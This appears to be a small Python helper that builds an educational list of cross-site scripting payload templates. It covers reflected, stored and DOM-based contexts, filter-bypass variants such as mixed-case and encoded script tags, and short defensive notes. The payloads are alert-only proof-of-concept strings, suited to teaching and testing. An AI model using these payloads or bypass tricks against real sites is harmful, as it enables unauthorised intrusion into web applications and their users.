def generate():
    """
    Generate advanced XSS payload templates.
    Educational use only.
    """

    payloads = []

    payloads.append("# TEMPLATE - EDUCATIONAL USE ONLY")
    payloads.append("")

    # ==========================
    # REFLECTED XSS
    # ==========================
    payloads.append("=== Reflected XSS ===")

    payloads.append("[HTML Context] <script>alert('XSS')</script>")
    payloads.append("[Attribute Context] \" onmouseover=\"alert('XSS')")
    payloads.append("[JavaScript Context] '; alert('XSS');//")

    # ==========================
    # STORED XSS
    # ==========================
    payloads.append("")
    payloads.append("=== Stored XSS ===")

    payloads.append("[Stored - Comment Section] <img src=x onerror=alert('XSS')>")

    # ==========================
    # DOM-BASED XSS
    # ==========================
    payloads.append("")
    payloads.append("=== DOM-Based XSS ===")

    payloads.append("[DOM Source Example] document.location")
    payloads.append("[DOM Sink Example] innerHTML")

    # ==========================
    # BYPASS TECHNIQUES
    # ==========================
    payloads.append("")
    payloads.append("=== Bypass Techniques ===")

    payloads.append("[Case Manipulation] <ScRiPt>alert('XSS')</ScRiPt>")
    payloads.append("[Tag Switching] <svg onload=alert('XSS')>")
    payloads.append("[Comment Injection] <script><!--alert('XSS')--></script>")
    payloads.append("[Encoded Example] %3Cscript%3Ealert('XSS')%3C/script%3E")

    # ==========================
    # DEFENSIVE NOTES
    # ==========================
    payloads.append("")
    payloads.append("=== Defensive Notes ===")

    payloads.append("WAF blocks <script> using signature-based detection.")
    payloads.append("Modern browsers use CSP (Content Security Policy).")
    payloads.append("Input validation & output encoding prevent XSS.")

    return payloads
